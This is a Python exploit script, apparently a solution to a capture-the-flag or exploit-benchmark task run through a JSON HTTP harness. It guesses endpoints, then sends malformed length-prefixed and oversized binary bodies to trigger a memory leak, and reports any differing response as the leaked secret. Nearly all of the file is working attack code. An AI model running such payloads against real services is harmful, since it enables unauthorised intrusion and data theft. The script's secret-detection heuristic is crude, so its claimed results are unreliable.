import sys, json, base64, binascii, time, string

def send_http(req):
    print(json.dumps({"http": req}), flush=True)
    line = sys.stdin.readline()
    if not line:
        sys.exit(0)
    return json.loads(line)

def request(path, method="GET", body_hex=None):
    req = {"method": method, "path": path, "headers": {"User-Agent": "exploit"}}
    if body_hex is not None:
        req["body_hex"] = body_hex
    return send_http(req)

def is_printable(b):
    try:
        s = b.decode('utf-8')
    except Exception:
        return False
    return all(c in string.printable for c in s)

def main():
    # Candidate endpoints
    candidates = ["/", "/parse", "/record", "/vuln", "/test", "/api", "/process"]
    endpoint = None
    baseline_body = b""
    for p in candidates:
        resp = request(p)
        if resp.get('status') == 200:
            endpoint = p
            # get baseline with empty POST
            resp2 = request(p, method="POST", body_hex="")
            try:
                baseline_body = base64.b64decode(resp2.get('body_b64',''))
            except Exception:
                baseline_body = b""
            break
    if endpoint is None:
        endpoint = "/parse"
        resp2 = request(endpoint, method="POST", body_hex="")
        try:
            baseline_body = base64.b64decode(resp2.get('body_b64',''))
        except Exception:
            baseline_body = b""
    # Prepare payload candidates
    payloads = []
    # 4-byte length prefixes (big endian) with small data
    for val in [0xffffffff, 0xdeadbeef, 0x7fffffff, 0x80000000, 0x00000000, 0x0000ffff, 0x00010000]:
        payloads.append(val.to_bytes(4, 'big') + b'A')
    # little endian versions
    for val in [0xffffffff, 0xdeadbeef, 0x7fffffff, 0x80000000, 0x00000000, 0x0000ffff, 0x00010000]:
        payloads.append(val.to_bytes(4, 'little') + b'A')
    # oversized raw buffers
    for size in [256, 512, 1024, 2048, 4096, 8192]:
        payloads.append(b'A'*size)
    # pattern: "LEN" + 2-byte size + data
    for size in [256, 512, 1024]:
        payloads.append(b'LEN' + size.to_bytes(2, 'big') + b'A'*size)
    secret_hex = ""
    for idx, pl in enumerate(payloads):
        resp = request(endpoint, method="POST", body_hex=pl.hex())
        body_b64 = resp.get('body_b64','')
        try:
            body = base64.b64decode(body_b64)
        except Exception:
            body = b''
        # If response differs from baseline and looks like non‑trivial data
        if body != baseline_body and len(body) > 0:
            # Heuristic: if body contains printable characters and length > 20
            if len(body) > 20 and is_printable(body):
                secret_hex = body.hex()
                break
            # If body is longer than baseline, assume secret present
            if len(body) > len(baseline_body):
                secret_hex = body.hex()
                break
    claim = {"secret_hex": secret_hex}
    print(f"CLAIM:{json.dumps(claim)}")

if __name__ == "__main__":
    main()